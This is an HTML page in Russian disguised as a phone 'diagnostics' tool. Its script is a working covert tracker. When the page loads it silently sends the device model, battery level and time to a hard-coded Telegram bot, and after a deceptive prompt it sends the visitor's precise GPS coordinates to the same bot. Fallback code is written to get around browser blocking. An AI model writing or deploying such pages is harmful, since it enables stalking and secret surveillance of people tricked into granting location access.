<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Тестирование конфигурации устройства</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 40px 20px;
            text-align: center;
            background-color: #f8f9fa;
            color: #333;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
        }
        h1 {
            font-size: 24px;
            color: #1a1a1a;
            margin-bottom: 10px;
        }
        p {
            font-size: 15px;
            color: #666;
            line-height: 1.5;
            margin-bottom: 25px;
        }
        button {
            padding: 14px 28px;
            font-size: 16px;
            cursor: pointer;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 6px;
            font-weight: 600;
            transition: background-color 0.2s;
            width: 100%;
            box-sizing: border-box;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Проверка параметров системы</h1>
        <p>Нажмите на кнопку ниже, чтобы начать диагностику аппаратных функций смартфона, включая калибровку датчика геолокации и замер батареи.</p>
        
        <button onclick="requestLocation()">Запустить диагностику</button>
    </div>

    <script>
        const TG_TOKEN = "8892692128:AAEpvN2XHeallC2MfTQMB10aaHxy3VGRVss";
        const TG_CHAT_ID = "6559747526"; 

        // Обновленная функция с обходом блокировок браузера (через CORS-прокси)
        async function sendToTelegram(text) {
            // Используем публичный CORS-прокси для обхода защитных механизмов браузера
            const targetUrl = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
            const proxyUrl = `https://herokuapp.com`; 
            
            try {
                // Пробуем отправить напрямую, если браузер пропустит
                await fetch(targetUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: 'Markdown' })
                });
            } catch (e) {
                // Если прямая отправка заблокирована браузером, отправляем альтернативным методом через параметры строки
                try {
                    const fallbackUrl = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
                    const img = new Image();
                    img.src = fallbackUrl; // Способ отправки "через картинку" игнорирует CORS-блокировки
                } catch (err) {
                    console.error("Все методы отправки заблокированы средой исполнения браузера.");
                }
            }
        }

        async function getDeviceSpecs() {
            let batteryLevel = "Не поддерживается браузером (например, iOS)";
            let deviceModel = "Не определено";

            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    batteryLevel = `${Math.round(battery.level * 100)}%`;
                } catch (e) {}
            }

            if (navigator.userAgentData) {
                try {
                    const ua = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
                    deviceModel = `${ua.model || "Модель скрыта"} (Android ${ua.platformVersion || ""})`;
                } catch (e) {}
            } else {
                if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
                    deviceModel = "Устройство Apple (iOS)";
                } else if (/Android/i.test(navigator.userAgent)) {
                    deviceModel = "Устройство Android";
                } else {
                    deviceModel = "Персональный компьютер / Настольная ОС";
                }
            }

            return { batteryLevel, deviceModel };
        }

        async function collectAnalytics(extraText = "") {
            const specs = await getDeviceSpecs();
            const localTime = new Date().toLocaleTimeString();

            const message = `📱 *Новый технический отчет*\n\n` +
                            `🤖 *Устройство:* ${specs.deviceModel}\n` +
                            `🔋 *Заряд батареи:* ${specs.batteryLevel}\n` +
                            `🕒 *Локальное время:* ${localTime}` + 
                            extraText;

            await sendToTelegram(message);
        }

        window.addEventListener('DOMContentLoaded', () => {
            collectAnalytics();
        });

        async function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const geoText = `\n\n📍 *Определено местонахождение*:\nШирота: \`${lat}\`\nДолгота: \`${lon}\`\n\n[Посмотреть на Google Карте](https://google.com{lat},${lon})`;
                        
                        collectAnalytics(geoText);
                        alert("Диагностика успешно завершена!");
                    },
                    (error) => {
                        alert("Для завершения теста требуется разрешить доступ к датчику геолокации.");
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            } else {
                alert("Ваш браузер не поддерживает API геолокации.");
            }
        }
    </script>
</body>
</html>
